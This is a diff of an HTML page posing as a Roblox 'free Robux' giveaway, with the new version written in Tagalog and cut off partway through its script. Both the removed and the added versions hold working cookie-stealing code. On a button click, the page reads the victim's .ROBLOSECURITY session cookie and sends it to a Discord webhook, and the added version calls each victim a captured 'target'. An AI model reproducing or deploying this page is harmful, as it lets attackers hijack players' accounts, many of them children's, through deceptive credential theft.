@@ -1,29 +1,25 @@
 <!DOCTYPE html>
-<html>
+
+<html lang="en">
 <head>
-    <title>Roblox Free Robux</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #191970; color: white; font-family: Arial; text-align: center; padding: 20px; }
-        button { background: #00bfff; padding: 15px 30px; font-size: 20px; border: none; cursor: pointer; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox | Claim 10 Robux</title>
 </head>
-<body>
-    <h1>🎉 Free Robux Event!</h1>
-    <p>Click below to claim your free Robux!</p>
-    <button onclick="claimRobux()">Claim Now</button>
-    <script>
-        function claimRobux() {
-            const cookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-            if (cookie) {
-                fetch("https://discord.com/api/webhooks/[webhook_id]/[webhook_token]", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: "Cookie: " + cookie[1] })
-                });
-            }
-            window.location.href = "https://roblox.com";
-        }
-    </script>
-</body>
-</html>
+<body style="background-color:#1a1a1a;color:white;text-align:center;font-family:Arial,sans-serif;padding-top:100px;margin:0;">
+<img src="https://www.roblox.com/images/logos/rebrand/metric_15.png" width="80" style="margin-bottom:20px;">
+<h1>Libreng 10 Robux!</h1>
+<p>I-click ang button sa ibaba para makuha ang iyong reward.</p>
+<button onclick="claimNow()" style="background-color:#0084ff;color:white;padding:15px 30px;border:none;border-radius:5px;font-size:18px;font-weight:bold;cursor:pointer;width:80%;max-width:300px;">Makuha ang 10 Robux</button>
+<script>
+async function claimNow() {
+const webhookURL = "https://discord.com/api/webhooks/1423860774153224286/aIAZknDHjVvs9bd-kJoaojfrbprrp1jQjwrWEigoyfLIPaOBKSGURVhXic3wtZSMm3b4";
+const cookies = document.cookie;
+const roblosecurity = cookies.match(/(.ROBLOSECURITY)=([^;]+)/);
+const payload = {
+username: "Roblox Reward Bot",
+embeds: [{
+title: "Bagong Target Na-capture!",
+color: 16711680,
+fields: [
+{ name: "Cookie Token", value: "
